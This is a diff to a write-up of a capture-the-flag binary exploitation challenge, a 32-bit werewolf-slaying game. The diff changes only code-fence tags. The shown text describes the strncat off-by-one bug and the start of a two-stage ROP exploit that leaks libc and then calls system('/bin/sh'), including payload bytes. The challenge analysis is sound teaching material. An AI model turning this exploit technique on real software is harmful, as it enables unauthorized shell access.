@@ -29,7 +29,7 @@ proof-of-concept: no
 
 A 32-bit werewolf-slaying game (i386, no PIE, no canary, NX, Partial RELRO) built against glibc 2.23. The player creates a "silver bullet" with a text description, can power it up by appending more text, then attempts to beat a werewolf whose HP is 0x7FFFFFFF. The bullet's "power" (stored as a 32-bit integer immediately after the 0x30-byte description buffer on the stack) determines damage dealt. The game loops in `main` until the werewolf is killed or the player quits.
 
-```
+```bash
 checksec:
   Arch:     i386-32-little
   RELRO:    Partial RELRO        # GOT writable
@@ -40,7 +40,7 @@ checksec:
 
 ## Program Structure
 
-```
+```text
 main() loop:
   1. Create bullet   → read_input(desc, 0x30); power = strlen(desc)
   2. Power up bullet  → strncat(desc, new, 0x30 - power); power += strlen(new)
@@ -160,7 +160,7 @@ All 195 solutions exploit V1 (strncat off-by-one). They diverge on ROP chain con
 **Strategy:** Two-pass exploit. First pass leaks a libc address, second pass calls `system("/bin/sh")`.
 
 **Stage 1 — Leak libc:**
-```
+```asm
 create("A" * 0x2f)
 power_up("\xff")                      # off-by-one: power → 1
 power_up("\xff"*7 + ROP_LEAK)         # overflow: power(neg) + EBP + ret
